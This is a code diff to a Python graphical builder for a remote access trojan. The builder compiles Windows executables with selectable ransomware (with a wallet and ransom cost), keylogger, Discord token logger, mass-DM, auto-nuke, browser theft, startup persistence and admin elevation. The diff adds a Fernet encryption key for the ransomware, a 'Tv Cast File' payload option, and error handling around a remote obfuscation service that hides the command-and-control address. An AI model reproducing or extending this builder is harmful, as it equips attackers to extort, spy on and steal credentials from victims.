@@ -3,6 +3,7 @@ from PIL import Image
 from colorama import Style, Fore
 from tkinter import filedialog as fd
 from bit import SUPPORTED_CURRENCIES
+from cryptography.fernet import Fernet
 import customtkinter, subprocess, websocket, threading, coincurve, requests, tkinter, shutil, base64, fade, time, os
 
 customtkinter.set_appearance_mode("dark")
@@ -106,7 +107,7 @@ class Frame(customtkinter.CTkFrame):
             else:
                 self.icon = tkinter.StringVar(value="")
 
-                widget = widget_type(master=self, text=title, command=lambda: self.file_prompt())
+                widget = widget_type(master=self, text=title, command=lambda: self.file_prompt("ico" if title == "File Icon" else "mp4"))
                 widget.grid(row=x, column=2, sticky="nsew")
 
                 widgets[title] = self.icon
@@ -130,9 +131,9 @@ class Frame(customtkinter.CTkFrame):
             if isinstance(widget, customtkinter.CTkEntry):
                 widget.configure(state="disabled" if not state else "normal")
 
-    def file_prompt(self):
+    def file_prompt(self, extension):
         filetypes = (
-            ('ICO files', '*.ico'),
+            (f'{extension.upper()} files', f'*.{extension}'),
         )
 
         filename = fd.askopenfilename(
@@ -197,7 +198,7 @@ class App(customtkinter.CTk):
             self.key = key
 
             for child in self.winfo_children()[1:]:
-                child.destroy()
+                child.destroy() # Abortion clinic
 
             self.menu()
 
@@ -248,11 +249,11 @@ class App(customtkinter.CTk):
             "Dynamic Webhook": customtkinter.CTkCheckBox,
             "Server Address": customtkinter.CTkEntry,
             "Server Password": customtkinter.CTkEntry,
-            "Webhook": customtkinter.CTkEntry
-            
+            "Webhook": customtkinter.CTkEntry,
+            "Tv Cast File": customtkinter.CTkButton,
         }
         
-        connection_frame = Frame(master=main_frame, default=[4], widgets=connection_widgets, row=0, column=5, columnspan=3, rowspan=10, pady=0, padx=20)
+        connection_frame = Frame(master=main_frame, default=[4], widgets=connection_widgets, row=0, column=5, columnspan=3, rowspan=10, pady=10, padx=20)
 
         misc_widgets = {
             "Key Logger": customtkinter.CTkCheckBox,
@@ -298,6 +299,7 @@ class App(customtkinter.CTk):
         massdm_script = ''
         keylogger = False
         dynamic_webhook = False
+        cast_file = 0
         
         ransomware = ransomware_config["Ransomware"].get()
         if ransomware:
@@ -320,6 +322,7 @@ class App(customtkinter.CTk):
             server_addr = base64.b64encode(connection_config['Server Address'].get().replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0].encode()).decode()
             server_key = base64.b64encode(connection_config['Server Password'].get().encode()).decode()
             dynamic_webhook = connection_config['Dynamic Webhook'].get()
+            cast_file = connection_config['Tv Cast File'].get()
         else:
             webhook = connection_config['Webhook'].get()
 
@@ -337,7 +340,7 @@ class App(customtkinter.CTk):
 
         self.response_label.configure(text='Compiling To Exe...')
 
-        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files])
+        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, cast_file, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files])
 
     @staticmethod
     def banner():
@@ -353,13 +356,14 @@ class App(customtkinter.CTk):
         """))
 
     def compile(self, config):
-        rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files = config
+        rat_client, server_addr, server_key, dynamic_webhook, webhook, cast_file, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files = config
         key = {
             "SERVER_CLIENT": rat_client,
             "HOSTNAME": f'O0O000OOO00O0OOO0("{server_addr}").decode()',
             "SERVERKEY": f'O0O000OOO00O0OOO0("{server_key}").decode()',
             "KEYLOGGER": keylogger,
             "RANSOMWARE": ransomware,
+            "FERNET_KEY": Fernet.generate_key().decode(),
             "REBOOTS_ALLOWED": reboots_allowed,
             "HOURS": hours,
             "CRYPTO_WALLET": wallet,
@@ -376,7 +380,11 @@ class App(customtkinter.CTk):
             "ADMIN": admin
         }
 
-        src = requests.get('https://septicx.pythonanywhere.com/api/obfuscate', json={
+        if not (self.base and self.recursion):
+            self.response_label.configure(text='Error: You must set the Base and Obfuscation level')
+            return
+
+        request = requests.get('https://septicx.pythonanywhere.com/api/obfuscate', json={
             "options": {
                 "base": self.base,
                 "recursion": self.recursion,
@@ -386,7 +394,13 @@ class App(customtkinter.CTk):
             "hwid": self.hwid,
             "key": self.key
             
-        }, headers={'content-type':'application/json'}).content
+        }, headers={'content-type':'application/json'})
+
+        if request.status_code != 200:
+            self.response_label.configure(text='Error: Webserver failed to compile successfully')
+            return
+
+        src = request.content
 
         dir = os.path.dirname(os.path.realpath(__file__))
 
@@ -406,8 +420,11 @@ class App(customtkinter.CTk):
             shutil.copyfile(path, f'src\\temp\\binder_{filename}')
             binder_args += ['--add-data', f'{dir}\\src\\temp\\binder_{filename};.']
 
+        filename = cast_file.split("/")[-1]
+        shutil.copyfile(cast_file, f'{dir}\\src\\temp\\cast_{filename}')
+
         coincurve_path = "\\".join(coincurve.__file__.split("\\")[:-1])
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + ['--clean', f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--windowed', '--noconfirm', '--onefile', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + ['--clean', f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
